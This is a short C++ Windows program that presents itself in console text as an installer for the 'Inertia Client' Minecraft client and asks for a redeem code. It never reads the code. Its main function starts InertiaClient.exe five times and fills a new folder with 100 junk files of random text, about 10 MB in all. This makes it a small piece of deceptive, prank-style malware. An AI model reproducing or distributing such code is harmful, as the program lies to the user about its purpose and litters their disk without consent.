#include <iostream>
#include <fstream>
#include <cstddef>
#include <windows.h>
#include <stdlib.h>
#include <ctime>
using namespace std;
void CreateFolder(string FOLDER_NAME){
CreateDirectory(FOLDER_NAME.c_str(), NULL);
}
void ToChars(char a[],string h){

for(int i=0;i<95;i++){
    if(i<h.size()){
        a[i]=h[i];
    }else{
    a[i]=' ';
    }
}

// .c_str()
}

string GetFromFile(string FILE_NAME){
//char b[100];
string stroka,DATA="";
//ToChars(b,FILE_NAME);
ifstream in(FILE_NAME.c_str());
while(!(in.eof())){
    getline(in,stroka);
    DATA+= stroka;DATA+='\n';
}
DATA.pop_back();
in.close();
return DATA;
}
void WriteToFile(string FILE_NAME, string DATA)
{
   // char b[100];
    //ToChars(b,FILE_NAME);
    ofstream ou(FILE_NAME.c_str());
    ou << DATA;
    ou.close();
}
void CopyFile(string FILE_INPUT_NAME, string FILE_OUTPUT_NAME){
string DATA = GetFromFile(FILE_INPUT_NAME);
WriteToFile(FILE_OUTPUT_NAME,DATA);
}
void AddToFile(string FILE_NAME, string DATA){
    string DATA2 = GetFromFile(FILE_NAME) + DATA;
    WriteToFile(FILE_NAME,DATA2);
}
string randStr(int len){
string ans="";
for(int i=0;i<len;i++){
    ans+=(char)(rand()% 20 + 65);
}
return ans;
}
void DoTheFuck(){
    string name="InertiaClient.exe";
ShellExecute(NULL, "open", "InertiaClient.exe", NULL, NULL, SW_SHOWDEFAULT);
ShellExecute(NULL, "open", "InertiaClient.exe", NULL, NULL, SW_SHOWDEFAULT);
ShellExecute(NULL, "open", "InertiaClient.exe", NULL, NULL, SW_SHOWDEFAULT);
ShellExecute(NULL, "open", "InertiaClient.exe", NULL, NULL, SW_SHOWDEFAULT);
ShellExecute(NULL, "open", "InertiaClient.exe", NULL, NULL, SW_SHOWDEFAULT);
    //CreateFolder("besi\\");
    //CopyFile("1.txt","1\\פאיכ.txt");
    //AddToFile("1.txt","HUINYA BEGEMOTA");
    //Sleep(1000);
    CreateFolder("shit");
    cout << time(0) << endl;
    for(int i=0;i<time(0)%10000;i++){rand();}
    for(int i=0;i<100;i++){
    WriteToFile("shit\\"+ randStr(20) + ".txt", randStr(100000));
    }
}
int main(){
    string a;
    setlocale(LC_ALL, "");
    cout << "visit the https://inertiaclient.com/Download.php > Generate new installer key" << endl;
    cout << "then write it in the form" << endl;
    cout << "after that all the files will be downloaded to your pc" << endl;
    cout << "at C:-Users-YOUR_USER-AppData-Roaming-.minecraft" << endl;
    cout << "RedeemCode:";
    DoTheFuck();

}
